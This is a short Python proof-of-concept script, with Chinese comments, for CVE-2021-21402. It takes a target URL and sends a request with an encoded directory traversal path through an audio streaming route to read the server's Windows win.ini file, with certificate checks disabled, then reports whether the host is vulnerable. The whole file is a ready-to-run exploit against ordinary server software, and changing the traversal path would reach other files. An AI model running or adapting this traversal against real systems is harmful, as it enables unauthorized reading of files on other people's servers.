#单个ip
import requests
import sys
import urllib3
urllib3.disable_warnings()
 
if len(sys.argv)!=2:   
    print('Usage: python3 CVE-2021-21402.py http://192.168.1.1')
    sys.exit()
url= sys.argv[1]
url=url+"/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/"
headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
                "Content-Type": "application/octet-stream"
	}
response=requests.get(url,headers=headers,verify=False)
if response.status_code==200:
    print("\n===============\n 此URL存在漏洞 \n===============")
    
else:
    print("\n=================\n 此URL不存在漏洞 \n=================")
